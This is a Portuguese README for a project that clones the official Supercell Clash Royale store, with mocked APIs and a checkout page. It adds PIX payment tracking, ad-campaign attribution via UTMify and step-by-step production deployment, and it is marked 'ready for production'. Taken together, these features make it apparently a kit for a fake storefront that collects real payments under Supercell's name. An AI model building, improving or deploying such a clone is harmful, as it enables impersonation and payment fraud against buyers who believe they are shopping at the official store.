# Site Clonado - Supercell Store Clash Royale

Clone completo de: https://store.supercell.com/pt/clashroyale

## 🚀 Novo: Integração UTMify

Este projeto agora inclui **integração completa com a plataforma UTMify** para rastreamento de vendas e conversões!

### ⚡ Quick Start - UTMify

```powershell
# 1. Instalar dependências
npm install

# 2. Configurar credencial da Utmify
# Edite utmify-proxy-server.js e adicione sua credencial

# 3. Iniciar servidores (loja + proxy)
npm run dev
```

**📖 Documentação completa da integração UTMify:**

- **[INSTALL.md](INSTALL.md)** - Guia de instalação rápida (5 min)
- **[UTMIFY-README.md](UTMIFY-README.md)** - Documentação completa
- **[SUMMARY.md](SUMMARY.md)** - Resumo do que foi implementado

### ✨ Funcionalidades UTMify

✅ Captura automática de parâmetros UTM  
✅ Rastreamento de pedidos (PIX gerado → PIX pago)  
✅ Atribuição de vendas às campanhas  
✅ Dashboard com métricas em tempo real  
✅ ROI por fonte/campanha  
✅ Integração segura via proxy backend

---

## Como usar

1. Instale as dependências:

```bash
npm install
```

2. Inicie o servidor:

```bash
npm start
```

3. Abra no navegador:

```
http://localhost:8080
```

### Comandos Disponíveis

```bash
npm start          # Inicia servidor principal (porta 8080)
npm run utmify     # Inicia proxy UTMify (porta 3001)
npm run dev        # Inicia ambos os servidores
```

## Estrutura

- `index.html` - Página principal
- `checkout.html` - Página de checkout
- `store.supercell.com/` - Assets do site
- `api-data/` - Respostas das APIs mockadas
- `mock-server.js` - Servidor que simula as APIs
- `external/` - Recursos de domínios externos

### Arquivos da Integração UTMify

- `utmify-integration.js` - Módulo principal de tracking
- `utm-capture.js` - Captura de UTMs em todas as páginas
- `utmify-proxy-server.js` - Servidor proxy backend (porta 3001)
- `utmify-examples.js` - Exemplos de uso
- `test-utmify.js` - Script de testes

## APIs Mockadas

Todas as chamadas de API foram capturadas e estão sendo servidas pelo mock server.
Verifique `api-data/manifest.json` para ver todas as APIs disponíveis.

## Testar com UTMs

Acesse a loja com parâmetros UTM para testar o tracking:

```
http://localhost:8080/?utm_source=facebook&utm_campaign=promo2024&utm_medium=cpc
```

Os UTMs serão capturados e incluídos automaticamente em todos os pedidos enviados à Utmify!

## 🌐 Deploy em Produção

### 🚂 Railway (RECOMENDADO)

**Railway é a melhor escolha para este projeto!**

✅ IP mais estável para API do Clash Royale  
✅ Deploy automático via GitHub  
✅ $5 grátis/mês (suficiente para começar)  
✅ Logs e monitoramento profissionais

**⚡ Deploy Rápido:**

```powershell
# 1. Preparar projeto
.\prepare-railway.ps1

# 2. Push para GitHub
git push

# 3. Conectar Railway ao GitHub
# 4. Deploy automático! 🚀
```

**📖 Guias completos:**

- [DEPLOY-RAILWAY.md](DEPLOY-RAILWAY.md) - Guia passo a passo
- [RAILWAY-VS-SQUARECLOUD.md](RAILWAY-VS-SQUARECLOUD.md) - Comparação detalhada

### ☁️ SquareCloud (Alternativa)

Deploy via upload de ZIP. Mais simples, mas IP menos estável.

**⚡ Deploy Rápido:**

```powershell
.\prepare-deploy.ps1
```

**📖 Guia completo:** [DEPLOY-SQUARECLOUD.md](DEPLOY-SQUARECLOUD.md)

### ⚠️ Importante: API do Clash Royale

A API oficial do Clash Royale **requer IP fixo registrado**.

**Soluções:**

1. **Railway** - IP mais estável ✅ Recomendado
2. **Dados mockados** - Incluídos no projeto
3. **Proxy com IP dedicado** - $5/mês adicional

Ver comparação detalhada: [RAILWAY-VS-SQUARECLOUD.md](RAILWAY-VS-SQUARECLOUD.md)

## Limitações

- APIs mockadas retornam dados estáticos (snapshot do momento do clone)
- Autenticação não persiste (use os cookies salvos se necessário)
- WebSockets e conexões em tempo real não funcionam
- Funcionalidades server-side do Next.js não estão disponíveis

## 📞 Suporte UTMify

- Dashboard: https://app.utmify.com.br
- Criar conta: https://app.utmify.com.br/register
- Documentação: [UTMIFY-README.md](UTMIFY-README.md)

---

**Status da Integração UTMify:** ✅ Pronto para produção  
**Versão:** 1.0  
**Última atualização:** 2026-01-12
